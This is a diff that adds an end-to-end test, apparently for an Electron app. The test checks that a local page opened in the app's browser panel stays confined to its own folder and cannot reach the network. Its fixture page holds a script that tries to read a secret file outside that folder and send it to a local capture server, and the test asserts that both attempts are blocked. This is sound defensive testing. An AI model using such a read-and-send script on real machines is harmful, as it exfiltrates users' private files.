@@ -282,6 +282,52 @@ describe('side panels', () => {
     }
   });
 
+  it("keeps a local page in the user's own browser to its folder and off the network (#281)", async () => {
+    const received: string[] = [];
+    const server = createServer((request, response) => {
+      received.push(request.url ?? '');
+      response.end('ok');
+    });
+    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+    const port = (server.address() as AddressInfo).port;
+    const root = mkdtempSync(join(tmpdir(), 'patch-panels-user-file-'));
+    try {
+      mkdirSync(join(root, 'site'));
+      writeFileSync(join(root, 'site', 'inside.txt'), 'INSIDE-281');
+      writeFileSync(join(root, 'secret.txt'), 'SECRET-281');
+      writeFileSync(
+        join(root, 'site', 'index.html'),
+        `<!doctype html><title>Loading</title><script>
+          const read = (url) => fetch(url).then((r) => r.text(), () => 'blocked');
+          Promise.all([read('inside.txt'), read(${JSON.stringify(pathToFileURL(join(root, 'secret.txt')).href)})])
+            .then(([inside, outside]) => {
+              fetch('http://127.0.0.1:${port}/up?d=' + encodeURIComponent(outside)).catch(() => {});
+              document.title = inside + '/' + outside;
+            });
+        </script>`,
+      );
+      await running.page.getByRole('tab', { name: 'Browser' }).click();
+      await running.page.getByLabel('Address').fill(pathToFileURL(join(root, 'site', 'index.html')).href);
+      await running.page.getByLabel('Address').press('Enter');
+      const title = () =>
+        running.app.evaluate(({ webContents, session }) =>
+          webContents
+            .getAllWebContents()
+            .find(
+              (contents) =>
+                contents.getType() === 'webview' && contents.session === session.fromPartition('persist:browser'),
+            )!
+            .getTitle(),
+        );
+      await expect.poll(title, { timeout: 15_000 }).toBe('INSIDE-281/blocked');
+      await new Promise((resolve) => setTimeout(resolve, 500));
+      expect(received).toEqual([]);
+    } finally {
+      await new Promise((resolve) => server.close(resolve));
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
   it('keeps both browser guests away from Node', async () => {
     const guestGlobals = await running.page.evaluate(() =>
       Promise.all(
